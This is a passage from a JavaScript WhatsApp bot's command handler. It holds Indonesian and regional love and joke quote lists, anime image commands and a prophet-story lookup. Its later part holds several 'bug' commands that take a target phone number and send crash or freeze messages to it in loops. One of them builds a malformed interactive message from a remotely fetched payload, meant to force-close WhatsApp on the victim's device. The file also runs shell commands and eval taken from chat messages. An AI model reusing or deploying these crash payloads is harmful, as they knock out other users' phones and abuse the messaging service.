    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const hmtruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${hmtruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
case 'animeneko':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await client.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: " SUCCES NI COK "}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await client.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: " SUCCES NI COK "},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(" WAIT TUNGGU TOD ")
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await client.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: " SUCCES NI COK "},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'kisahnabi': {
     if (!text) return reply(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break
case "muslimai": {
if (!text) return reply("Mau Nanya Apa Ke MuslimAi")
async function muslimAi(text) {
    try {
        const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`)
 reply(`*[ Muslim Ai ]*\n\nPertanyaan: ${text}\n\nJawaban: ${JSON.stringify(response.data.data, null, 2)}`)
    } catch (e) {
        m.reply(e)
    }
}

muslimAi(text)
}

break			
case "blankui":
case "crashui":
case "systemui": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaBlankUi(X)
    }
}

break			
case "delaymaker": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaDelayMakers(X)
    }
}

break			
case "stuckhome": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaStuckHome(X)
    }
}

break			
case "xateamcrash": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaCrash(X)
    }
}

break			
case "bughard": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaBlankUi(X)
       await XaCrash(X)
    }
}

break			
case "invisible": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 200; i++) {
       await XaInvis(X)
    }
}

break			
case "xacrashv1": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 50; i++) {
       await XaCrash(X)
       await sleep(2000)
       await XaCrash(X)
    }
}

break			
case "xacrashv2": {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const X = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${X}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})
for (let i = 0; i < 100; i++) {
       await XaCrash(X)
       await sleep(5000) 
       await XaCrash(X)
    }
}

break
case 'xacrashv3':
case 'xhamz': {
if (!isOwner && !isPremium) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) return reply(`Example: ${prefix + command} 628XXX`);
const target = text.trim();
const isTarget = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await client.sendMessage(m.chat, {image: {url: `${thumb}`}, 
caption: `𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${isTarget}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭𝟬 𝗦𝗲𝗰𝗼𝗻𝗱`})
await sleep(10000)
await client.sendMessage(m.chat, {image: {url: `${thumb2}`}, 
caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴 𝗧𝗼 ${isTarget}\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟮𝟬 𝗠𝗶𝗻𝘂𝘁𝗲𝘀`})

  let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
  
  // Parameters
  for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [isTarget],
           forwardedNewsletterMessageInfo: {
          newsletterJid: "9741@newsletter",
        serverMessageId: 1,
     newsletterName: "-"
     },
            externalAdReply: {
              showAdAttribution: true,
              title: "𝐗𝐀 𝐓𝐄𝐀𝐌 𝐂𝐑𝐀𝐒𝐇",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "𝐗𝐀 𝐓𝐄𝐀𝐌 𝐂𝐑𝐀𝐒𝐇",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝐗𝐀 𝐓𝐄𝐀𝐌 𝐂𝐑𝐀𝐒𝐇",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝐗𝐀 𝐓𝐄𝐀𝐌 𝐂𝐑𝐀𝐒𝐇",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await client.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
await sleep(5000)
console.log("success send force close whatsapp api")
}
}
break
case "public": {
if (!isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿") 
client.public = true
reply(" Succes Public Mode ") 
}
break
case "self": {
if (!isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿") 
client.public = false
reply(" Succes Self Mode ") 
}

break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isDev) return
exec(budy.slice(2), (err, stdout) => {
if(err) return client.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return client.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isDev) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return client.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return client.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isDev) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
client.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
client.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})